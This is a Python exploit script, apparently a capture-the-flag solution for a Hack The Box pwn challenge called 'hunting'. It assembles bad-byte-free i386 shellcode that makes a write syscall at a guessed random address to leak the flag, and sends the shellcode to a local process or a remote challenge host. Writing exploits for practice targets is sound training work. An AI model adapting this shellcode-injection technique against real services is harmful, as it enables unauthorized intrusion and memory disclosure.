#!/usr/bin/env python
import ptrlib as ptr
import sys
import random
import os

# import pwn

exe = ptr.ELF("./hunting")

# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return ptr.Socket("94.237.50.250", 34213)
    else:
        return ptr.Process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("unwrap failed")
        exit(1)
    else:
        return x


def generate_random_number():
    # /dev/urandomから8バイトのランダムデータを取得
    random_bytes = os.urandom(8)
    random_value = int.from_bytes(random_bytes, byteorder="big")

    # 乱数生成器を初期化
    random.seed(random_value)

    i = 0
    # 指定された範囲の乱数を生成
    while not (i > 0x5FFFFFFF and i <= 0xF7000000):
        i = random.randint(0, 0xFFFF) << 16

    return i >> 16


def attack() -> None | str:
    print(hex(generate_random_number()))
    io = connect()
    # input(">>")
    # io.sendline(b"A")
    # input(">>")
    # return
    prefix = hex(generate_random_number())
    # prefix = "0x62db"

    code = []

    code.append("xor eax, eax")
    code.append("mov al, 0x4")

    code.append(f"mov ecx, {prefix}1111")
    code.append("sub cx, 0x1111")

    code.append("xor ebx, ebx")
    code.append("add bl, 0x1")

    code.append("xor edx, edx")
    code.append("mov dl, 0x28")

    code.append("int 0x80")

    pl = unwrap(ptr.assemble(";".join(code), arch="i386"))
    # print(pl.hex())
    # print()
    # print(len(pl))

    # seed: stack + 0x2aa60

    if (b"\x00" in pl) or (b"\x09" in pl) or (b"\x0a" in pl) or (b"\x20" in pl):
        ptr.logger.error("invalid code")
        io.close()
        return None

    input(">>")
    io.sendline(pl)
    input(">>")

    print("receiving...")

    # try:
    #     io.recvuntil("HTB", timeout=0.1)
    # except TimeoutError:
    #     io.close()
    #     print("no luck :(")
    #     return None

    # flag = "HTB" + io.recvuntil("}").decode()
    # return flag


def main():
    # count = 0
    # while True:
    #     count += 1
    #     result = attack()
    #     if result is None:
    #         continue
    #     else:
    #         print(result)
    #         print(count)
    #         break
    attack()


if __name__ == "__main__":
    main()
